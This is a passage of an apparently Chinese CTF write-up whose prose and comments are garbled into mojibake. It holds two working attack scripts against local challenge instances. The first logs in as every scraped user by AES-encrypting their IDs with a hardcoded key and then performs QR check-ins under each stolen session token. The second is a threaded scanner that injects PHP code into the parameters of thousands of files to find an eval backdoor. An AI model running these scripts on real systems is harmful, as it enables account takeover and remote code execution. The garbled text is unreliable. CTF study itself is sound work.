<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><br>def encrypt_by_aes<span class="hljs-function"><span class="hljs-params">(plaintext: str, key: str, iv: str)</span> -&gt;</span> str:<br>    key_bytes = key.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    iv_bytes = iv.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    cipher = AES.<span class="hljs-keyword">new</span>(key_bytes, AES.MODE_CBC, iv_bytes)<br>    <br>    <span class="hljs-comment"># å°†æ˜æ–‡è½¬ä¸ºå­—èŠ‚å¹¶è¿›è¡Œå¡«å……ï¼ˆå¡«å……åˆ°å—å¤§å°çš„å€æ•°ï¼Œé€šå¸¸æ˜¯16å­—èŠ‚ï¼‰</span><br>    plaintext_bytes = pad(plaintext.encode(<span class="hljs-string">&quot;utf-8&quot;</span>), AES.block_size)<br>    <br>    <span class="hljs-comment"># åŠ å¯†</span><br>    encrypted_bytes = cipher.encrypt(plaintext_bytes)<br>    <br>    <span class="hljs-comment"># å°†åŠ å¯†åçš„å­—èŠ‚è¿›è¡Œ base64 ç¼–ç </span><br>    encrypted = base64.b64encode(encrypted_bytes).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <br>    <span class="hljs-keyword">return</span> encrypted<br><br><br>def decrypt_by_aes<span class="hljs-function"><span class="hljs-params">(encrypted: str, key: str, iv: str)</span> -&gt;</span> str:<br>    key_bytes = key.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    iv_bytes = iv.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    cipher = AES.<span class="hljs-keyword">new</span>(key_bytes, AES.MODE_CBC, iv_bytes)<br><br>    <span class="hljs-comment"># è§£å¯†å‰éœ€è¦å°† base64 ç¼–ç çš„å­—ç¬¦ä¸²è§£ç ä¸ºå­—èŠ‚</span><br>    encrypted_bytes = base64.b64decode(encrypted)<br><br>    <span class="hljs-comment"># è§£å¯†</span><br>    decrypted_bytes = cipher.decrypt(encrypted_bytes)<br><br>    <span class="hljs-comment"># å»é™¤å¡«å……</span><br>    pad = decrypted_bytes[-<span class="hljs-number">1</span>]<br>    decrypted_bytes = decrypted_bytes[:-pad]<br><br>    <span class="hljs-comment"># å°†å­—èŠ‚è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span><br>    decrypted = decrypted_bytes.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> decrypted<br><br>key = <span class="hljs-string">&quot;u2oh6Vu^HWe4_AES&quot;</span><br>iv = <span class="hljs-string">&quot;u2oh6Vu^HWe4_AES&quot;</span><br><br><span class="hljs-comment"># è¦åŠ å¯†çš„æ˜æ–‡</span><br>plaintext = <span class="hljs-string">&quot;9613331&quot;</span><br><br><span class="hljs-comment"># åŠ å¯†</span><br>encrypted_text = encrypt_by_aes(plaintext, key, iv)<br><span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;Encrypted: &#123;encrypted_text&#125;&quot;</span>)<br><span class="hljs-comment">#print(encrypted_text)</span><br><br><span class="hljs-comment"># è§£å¯†</span><br><span class="hljs-comment">#decrypted_text = decrypt_by_aes(encrypted_text, key, iv)</span><br><span class="hljs-comment">#print(f&quot;Decrypted: &#123;decrypted_text&#125;&quot;)</span><br></code></pre></td></tr></table></figure>
<p>ä¸æŠ“åŒ…å†…å®¹å¯¹æ¯”çœ‹æ˜¯å¦å¯¹åº”çš„ä¸Š<br><img src="/images/89CE3D753D154e83931B21372005A7F6.png" srcset="/img/loading.gif" lazyload><br>ä¸€æ¨¡ä¸€æ ·<br>æ¥ç€è¢«å¯¼èˆªåˆ°&#x2F;page&#x2F;sign&#x2F;signIn<br><img src="/images/0907CE4A836C46ffB60EAAF1CF134B15.png" srcset="/img/loading.gif" lazyload><br>æ‰«æäºŒç»´ç ï¼Œè·³å‡ºäºŒç»´ç å†…å®¹ï¼Œè¿›å…¥è¿™ä¸ªç½‘é¡µå°±èƒ½ç­¾åˆ°äº†</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">58882</span><span class="hljs-regexp">/widget/</span>sign/e?id=<span class="hljs-number">4000000000000</span>&amp;c=<span class="hljs-number">3232369319357</span>&amp;enc=BAEEA1B833B76CFB2FF25FE93836D711&amp;DB_STRATEGY=PRIMARY_KEY&amp;STRATEGY_PARA=id<br></code></pre></td></tr></table></figure>
<p><img src="/images/395C504A4F39451c92DA9DBB24A305A5.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œencå’ŒsignCodeå·²ç»å˜äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ¨æ–­å‡ºå¯¹åº”çš„æ˜¯ä¸Šé¢çš„cå’Œencå€¼<br>æ¥ä¸‹æ¥æˆ‘ä»¬è¿˜è¦æŠŠç½‘é¡µä¸Šçš„ç”¨æˆ·çˆ¬ä¸‹æ¥,è¿™é‡Œæˆ‘æ˜¯å…ˆä¿å­˜åˆ°æœ¬åœ°å†çˆ¬çš„</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># æœ¬åœ° HTML æ–‡ä»¶è·¯å¾„</span><br>html_file = <span class="hljs-string">&quot;./ç­¾åˆ°.html&quot;</span>  <span class="hljs-comment"># æ›¿æ¢ä¸ºä½ çš„æœ¬åœ° HTML æ–‡ä»¶è·¯å¾„</span><br>output_file = <span class="hljs-string">&quot;output1.txt&quot;</span>  <span class="hljs-comment"># ä¿å­˜ç»“æœçš„æ–‡ä»¶å</span><br><br><span class="hljs-comment"># è¯»å–å¹¶è§£æ HTML æ–‡ä»¶</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(html_file, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    soup = BeautifulSoup(file, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br><br><span class="hljs-comment"># æ‰“å¼€è¾“å‡ºæ–‡ä»¶ï¼Œä»¥å†™å…¥æ¨¡å¼</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&quot;w&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> out_file:<br>    <span class="hljs-comment"># æŸ¥æ‰¾æ‰€æœ‰ç¬¦åˆæ¡ä»¶çš„ &lt;div&gt; æ ‡ç­¾</span><br>    divs = soup.find_all(<span class="hljs-string">&#x27;div&#x27;</span>, class_=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;item zoomIn \d+&#x27;</span>))<br><br>    <span class="hljs-comment"># æå– class å±æ€§ä¸­çš„æ•°å­—å¹¶ä¿å­˜åˆ°æ–‡ä»¶ä¸­</span><br>    <span class="hljs-keyword">for</span> div <span class="hljs-keyword">in</span> divs:<br>        class_attr = div.get(<span class="hljs-string">&#x27;class&#x27;</span>)  <span class="hljs-comment"># è·å– class å±æ€§</span><br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> class_attr:<br>            <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;\d+&#x27;</span>, item)  <span class="hljs-comment"># æŸ¥æ‰¾ class å±æ€§ä¸­çš„æ•°å­—</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>                out_file.write(<span class="hljs-keyword">match</span>.group() + <span class="hljs-string">&quot;\n&quot;</span>)  <span class="hljs-comment"># å°†æ•°å­—å†™å…¥æ–‡ä»¶å¹¶æ¢è¡Œ</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æå–çš„æ•°å­—å·²ä¿å­˜åˆ° <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>æ€è·¯ï¼š<br>çˆ¬å–é¡µé¢ç”¨æˆ·çš„è´¦æˆ·â€“&gt;&#x2F;v2&#x2F;apis&#x2F;sign&#x2F;refreshQRCodeè·å–encå’ŒsignCodeå€¼â€“&gt;æŠŠè´¦æˆ·AESåŠ å¯†â€“&gt;è®¿é—®&#x2F;fanyaloginé¡µé¢å‘é€æ•°æ®åŒ…â€“&gt;è·å–cookieså€¼â€“&gt;ä»¥cookieså†…çš„èº«ä»½è¿›å…¥äºŒç»´ç å†…å®¹é¡µé¢</p>
<p>æœ€ç»ˆä»£ç </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import re<br>import base64<br><span class="hljs-keyword">from</span> Crypto.Cipher import AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding import pad<br>import time<br><br><br>def encrypt_by_aes(plaintext: str, key: str, iv: str) -&gt; str:<br>    key_bytes = key.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    iv_bytes = iv.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)<br><br>    # å°†æ˜æ–‡è½¬ä¸ºå­—èŠ‚å¹¶è¿›è¡Œå¡«å……ï¼ˆå¡«å……åˆ°å—å¤§å°çš„å€æ•°ï¼Œé€šå¸¸æ˜¯16å­—èŠ‚ï¼‰<br>    plaintext_bytes = pad(plaintext.encode(<span class="hljs-string">&quot;utf-8&quot;</span>), AES.block_size)<br><br>    # åŠ å¯†<br>    encrypted_bytes = cipher.encrypt(plaintext_bytes)<br><br>    # å°†åŠ å¯†åçš„å­—èŠ‚è¿›è¡Œ base64 ç¼–ç <br>    encrypted = base64.b64encode(encrypted_bytes).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br>    return encrypted<br><br>key = <span class="hljs-string">&quot;u2oh6Vu^HWe4_AES&quot;</span><br>iv = <span class="hljs-string">&quot;u2oh6Vu^HWe4_AES&quot;</span><br><br><br><br><br><br><span class="hljs-comment"># ä¿å­˜ç»“æœçš„æ–‡ä»¶å</span><br>output_file = <span class="hljs-string">&quot;output1.txt&quot;</span><br><br><span class="hljs-comment"># è¯»å–ä¿å­˜çš„æ•°æ®</span><br>with open(output_file, <span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&quot;utf-8&quot;</span>) as file:<br>    lines = file.readlines()<br><br><span class="hljs-comment"># å¾ªç¯éå†æ¯ä¸€è¡Œæ•°æ®</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>    a = requests.session()<br><br>    url = <span class="hljs-string">&#x27;http://127.0.0.1:35849/v2/apis/sign/refreshQRCode&#x27;</span><br><br>    b = a.<span class="hljs-built_in">get</span>(<span class="hljs-attribute">url</span>=url)<br>    <span class="hljs-built_in">print</span>(b.text)<br>    # æå–signCode<br>    signCode = re.findall(r<span class="hljs-string">&#x27;&quot;signCode&quot;:&quot;(.*?)&quot;&#x27;</span>, b.text)<br>    signCode = str(signCode)<br>    signCode = signCode.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br>    # æå–encå€¼<br>    enc = re.findall(r<span class="hljs-string">&#x27;&quot;enc&quot;:&quot;(.*?)&quot;&#x27;</span>, b.text)<br>    enc = str(enc)<br>    enc = enc.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;signCode=&#x27;</span>, signCode)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;enc=&#x27;</span>, enc)<br><br>    number = line.strip()  # å»é™¤è¡Œæœ«å°¾çš„æ¢è¡Œç¬¦<br>    plaintext = number<br>    encrypted_text = encrypt_by_aes(plaintext, key, iv)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;encrtpted==&#x27;</span>,encrypted_text)<br>    <span class="hljs-attribute">url1</span>=<span class="hljs-string">&#x27;http://127.0.0.1:35849/fanyalogin&#x27;</span><br>    data=&#123;<br>    <span class="hljs-string">&quot;fid&quot;</span>:-1,<br>    <span class="hljs-string">&quot;uname&quot;</span>:f<span class="hljs-string">&quot;&#123;encrypted_text&#125;&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>:f<span class="hljs-string">&quot;&#123;encrypted_text&#125;&quot;</span>,<br>    <span class="hljs-string">&quot;refer&quot;</span>:<span class="hljs-string">&quot;https%253A%252F%252Fi.chaoxing.com&quot;</span>,<br>    <span class="hljs-string">&quot;t&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>,<br>    <span class="hljs-string">&quot;forbidotherlogin&quot;</span>:0,<br>    <span class="hljs-string">&quot;doubleFactorLogin&quot;</span>:0,<br>    <span class="hljs-string">&quot;independentId&quot;</span>:0,<br>    <span class="hljs-string">&quot;independentNameId&quot;</span>:0<br>    &#125;<br><br>    cookies = &#123;<br>        <span class="hljs-string">&quot;retainlogin&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>        <span class="hljs-string">&quot;token&quot;</span>: <span class="hljs-string">&quot;f5ba764e-040a-400c-ae13-80fedd7caac6&quot;</span><br>    &#125;<br>    <span class="hljs-attribute">login1</span>=requests.session()<br>    login = login1.post(<span class="hljs-attribute">url</span>=url1,data=data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;dataæ³¨å…¥&quot;</span>,login)<br>    # <span class="hljs-built_in">print</span>(login.cookies)<br>    cook = login.cookies<br>    <span class="hljs-built_in">print</span>(cook)<br>    <span class="hljs-keyword">for</span> cookie <span class="hljs-keyword">in</span> cook:<br>        <span class="hljs-keyword">if</span> cookie.name == <span class="hljs-string">&quot;token&quot;</span>:<br>            token_value = cookie.value #tokenå€¼<br>            <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;token=&#123;token_value&#125;&quot;</span>)<br>            cookies[<span class="hljs-string">&quot;token&quot;</span>]=token_value<br>            break  # æ‰¾åˆ°åå°±å¯ä»¥åœæ­¢éå†<br>    <span class="hljs-built_in">print</span>(cookies)<br><br>    url2 =f<span class="hljs-string">&#x27;http://127.0.0.1:35849/widget/sign/e?id=4000000000000&amp;c=&#123;signCode&#125;&amp;enc=&#123;enc&#125;&amp;DB_STRATEGY=PRIMARY_KEY&amp;STRATEGY_PARA=id&#x27;</span><br>    <span class="hljs-attribute">login3s</span>=requests.session()<br>    login3 = login3s.<span class="hljs-built_in">get</span>(<span class="hljs-attribute">url</span>=url2,cookies=cookies)<br>    <span class="hljs-built_in">print</span>(login3)<br>    time.sleep(0.5)<br></code></pre></td></tr></table></figure>


<h2 id="å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢"></a>[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</h2><p><img src="/images/395D0C10155740ceBB6309AC7D96DDC1.png" srcset="/img/loading.gif" lazyload><br>æºç å·²ç»æ‰“åŒ…å¥½äº†ï¼Œä¸‹è½½<br><img src="/images/D5F774D3C3B54f31895C86EEC33ACD87.png" srcset="/img/loading.gif" lazyload><br>å‘ç°æœ‰ä¸‰åƒå¤šä¸ªphpæ–‡ä»¶ï¼Œä¸”åŸºæœ¬ä¸Šæ¯ä¸ªæ–‡ä»¶éƒ½æœ‰evalå¯èƒ½ä¼šè¢«åˆ©ç”¨ï¼Œä½†æ¯•ç«Ÿä¸‰åƒå¤šä¸ªæ–‡ä»¶æˆ‘ä»¬ä¸å¯èƒ½ä¼šä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™ä¸€ä¸ªè‡ªåŠ¨åŒ–è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;å¼€å§‹æ—¶é—´ï¼š  &#x27;</span> + time.asctime(time.localtime(time.time())))  <span class="hljs-comment"># åªæ˜¯ä¸€ä¸ªç®€å•çš„æ—¶é—´å‡½æ•°ï¼Œçœ‹èµ·æ¥æ›´æ¼‚äº®ç½¢äº†</span><br>s1 = threading.Semaphore(<span class="hljs-number">100</span>)  <span class="hljs-comment"># è¿™å„¿è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°</span><br>filePath = <span class="hljs-string">r&quot;D:/websafe/phpstudy/phpstudy_pro/WWW/www/src/&quot;</span><br>os.chdir(filePath)  <span class="hljs-comment"># æ”¹å˜å½“å‰çš„è·¯å¾„ï¼Œè¿™ä¸ªè¿˜æ˜¯ä¸å¤ªæ‡‚</span><br>requests.adapters.DEFAULT_RETRIES = <span class="hljs-number">5</span>  <span class="hljs-comment"># è®¾ç½®é‡è¿æ¬¡æ•°ï¼Œé˜²æ­¢çº¿ç¨‹æ•°è¿‡é«˜ï¼Œæ–­å¼€è¿æ¥</span><br>files = os.listdir(filePath)  <span class="hljs-comment"># å¾—åˆ°è¯¥ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„åç§°</span><br>session = requests.Session()  <span class="hljs-comment"># å¾—åˆ°session()ä¸ºä¹‹åçš„å®ç°ä»£ç å›æ˜¾å¾—å–åˆ›é€ æ¡ä»¶</span><br>session.keep_alive = <span class="hljs-literal">False</span>  <span class="hljs-comment"># è®¾ç½®è¿æ¥æ´»è·ƒçŠ¶æ€ä¸ºFalse</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_content</span>(<span class="hljs-params">file</span>):<br>    s1.acquire()  <span class="hljs-comment"># å¥½åƒä¸é”ä»€ä¹ˆçš„ç›¸å…³ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸å¤ªæ‡‚ï¼Œå¤šçº¿ç¨‹å¼€å¯</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;trying   &#x27;</span> + file + <span class="hljs-string">&#x27;     &#x27;</span> + time.asctime(time.localtime(time.time())))  <span class="hljs-comment"># æ›´å¥½çœ‹ï¼ŒåŒæ—¶å¯ä»¥å¯¹æ¯”ä¸åŠ çº¿ç¨‹å’ŒåŠ çº¿ç¨‹çš„æ—¶é—´å¯¹æ¯”</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:  <span class="hljs-comment"># æ‰“å¼€phpæ–‡ä»¶ï¼Œæå–æ‰€æœ‰çš„$_GETå’Œ$_POSTçš„å‚æ•°</span><br>        gets = <span class="hljs-built_in">list</span>(re.findall(<span class="hljs-string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))<br>        posts = <span class="hljs-built_in">list</span>(re.findall(<span class="hljs-string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))<br>    data = &#123;&#125;  <span class="hljs-comment"># æ‰€æœ‰çš„$_POST</span><br>    params = &#123;&#125;  <span class="hljs-comment"># æ‰€æœ‰çš„$_GET</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> gets:<br>        params[m] = <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> posts:<br>        data[n] = <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br>    url = <span class="hljs-string">&#x27;http://127.0.0.1/www/src/&#x27;</span> + file<br>    req = session.post(url, data=data, params=params)  <span class="hljs-comment"># ä¸€æ¬¡æ€§è¯·æ±‚æ‰€æœ‰çš„GETå’ŒPOST</span><br>    req.close()  <span class="hljs-comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span><br>    req.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br>    content = req.text<br>    <span class="hljs-comment"># print(content)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:  <span class="hljs-comment"># å¦‚æœå‘ç°æœ‰å¯ä»¥åˆ©ç”¨çš„å‚æ•°ï¼Œç»§ç»­ç­›é€‰å‡ºå…·ä½“çš„å‚æ•°</span><br>        flag = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> gets:<br>            req = session.get(url + <span class="hljs-string">&#x27;?%s=&#x27;</span> % a + <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)<br>            content = req.text<br>            req.close()  <span class="hljs-comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:<br>                flag = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> flag != <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> posts:<br>                req = session.post(url, data=&#123;b: <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)<br>                content = req.text<br>                req.close()  <span class="hljs-comment"># å…³é—­è¯·æ±‚  é‡Šæ”¾å†…å­˜</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span>:  <span class="hljs-comment"># flagç”¨æ¥åˆ¤æ–­å‚æ•°æ˜¯GETè¿˜æ˜¯POSTï¼Œå¦‚æœæ˜¯GETï¼Œflag==1ï¼Œåˆ™bæœªå®šä¹‰ï¼›å¦‚æœæ˜¯POSTï¼Œflagä¸º0ï¼Œ</span><br>            param = a<br>        <span class="hljs-keyword">else</span>:<br>            param = b<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;æ‰¾åˆ°äº†åˆ©ç”¨æ–‡ä»¶ï¼š &#x27;</span> + file + <span class="hljs-string">&quot;  and æ‰¾åˆ°äº†åˆ©ç”¨çš„å‚æ•°ï¼š%s&quot;</span> % param)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ç»“æŸæ—¶é—´ï¼š  &#x27;</span> + time.asctime(time.localtime(time.time())))<br>    s1.release()  <span class="hljs-comment"># å¯¹åº”äºä¹‹å‰çš„å¤šçº¿ç¨‹æ‰“å¼€</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> files:  <span class="hljs-comment"># åŠ å…¥å¤šçº¿ç¨‹</span><br>    t = threading.Thread(target=get_content, args=(i,))<br>    t.start()<br></code></pre></td></tr></table></figure>
